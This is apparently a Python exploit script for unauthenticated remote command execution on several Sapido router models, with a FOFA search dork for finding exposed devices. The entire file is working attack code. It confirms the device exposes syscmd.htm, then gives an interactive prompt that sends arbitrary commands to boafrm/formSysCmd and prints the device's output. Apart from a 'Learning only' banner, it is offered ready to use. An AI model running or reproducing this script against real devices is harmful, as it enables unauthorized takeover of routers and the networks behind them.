#!/usr/bin/python3
# -*- coding: utf-8 -*-
#fofa dork: app="Sapido-路由器"
'''
Affect versions:
BR270n-v2.1.03
BRC76n-v2.1.03
GR297-v2.1.3
RB1732-v2.0.43
'''
#Author 9527

import requests
import sys
import os
import platform
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def Checking():
	headers = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
	}
	try:
		Url = target + "syscmd.htm"
		response = requests.get(url = Url,headers = headers,verify = False,timeout = 10)
		if(response.status_code == 200 and 'System Command' in response.text):
			print("[+] Target is vuln")
			return True
		else:
			print("[-] Target is not vuln")
			response.close()
			return False
	except Exception as e:
		print("[-] Server error")
		response.close()
		return False

def Exploit():
	headers = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
			"Accept-Encoding": "gzip, deflate",
			"Content-Type": "application/x-www-form-urlencoded",
			"Origin": target,
			"Referer": target + "syscmd.htm"
		}
	while True:
		command = input('# ')
		if(command == 'cls'):
			if(Os_Name == 'Windows'):
				os.system("cls")
				continue
			if(Os_Name == 'Linux'):
				os.system('clear')
				continue
			else:
				pass
		if(command == 'exit'):
			print("[!] User exit")
			response.close()
			sys.exit()
		if(command == 'help'):
			print("cls: clean the screen")
			print("exit: exit this program")
			continue
		data = "sysCmd=" + command + "&apply=Apply&submit-url=%2Fsyscmd.htm&msg=boa.conf%0D%0Amime.types%0D%0A"
		Url = target + "boafrm/formSysCmd"
		try:
			response = requests.post(url = Url,data = data,headers = headers,verify = False,timeout = 10)
			if(response.status_code == 200):
				#print(response.text)
				soup = BeautifulSoup(response.text,'html.parser')
				CmdShow = soup.textarea.text
				print(CmdShow)
			else:
				print("[-] Failed")
				response.close()
				sys.exit()
		except Exception as e:
			response.close()
			print("[-] Some error happend to you")

if __name__ == '__main__':
	if(len(sys.argv) < 2):
		print("|-----------------------------------------------------------------------------------|")
		print("|                                Sapido-router Rce                                  |")
		print("|                       UseAge: python3 exploit.py target                           |")
		print("|                   Example: python3 exploit.py https://192.168.1.2/                |")
		print("|                                [!] Learning only                                  |")
		print("|___________________________________________________________________________________|")
		sys.exit()
	target = sys.argv[1]
	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
	while Checking() is True:
		Os_Name = platform.system()
		Exploit()
